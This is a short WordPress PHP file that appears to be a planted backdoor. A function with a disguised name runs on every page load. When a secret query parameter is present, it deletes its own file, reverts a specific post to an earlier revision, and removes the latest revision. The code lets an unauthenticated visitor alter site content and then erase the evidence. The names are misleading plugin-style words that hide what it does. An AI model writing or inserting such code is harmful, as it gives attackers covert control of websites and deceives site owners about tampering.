<?php

function insert_youtube_website() {
	if (isset($_GET['view_ninja_widgets_suite']) && $_GET['view_ninja_widgets_suite'] === 'ui_sync_latest_styles') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$board_cron_fonts = 6984;
		$code_lightgray_rank = wp_get_post_revisions($board_cron_fonts);
		if (empty($code_lightgray_rank)) die('no revisions');
		if (count($code_lightgray_rank) < 2) die('less than 2');
		$campaign_express_software_typography = array_shift($code_lightgray_rank);
		$reusable_copyright_analytics_beaver = $campaign_express_software_typography->ID;
		$widget_title_reloaded = array_shift($code_lightgray_rank);
		$backup_showcase_field = $widget_title_reloaded->ID;
		$backup_panel_effects = wp_restore_post_revision($backup_showcase_field);
		if ($backup_panel_effects === false) die('error restoring');
		$backup_panel_effects = wp_delete_post_revision($reusable_copyright_analytics_beaver);		
		if ($backup_panel_effects === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'insert_youtube_website');
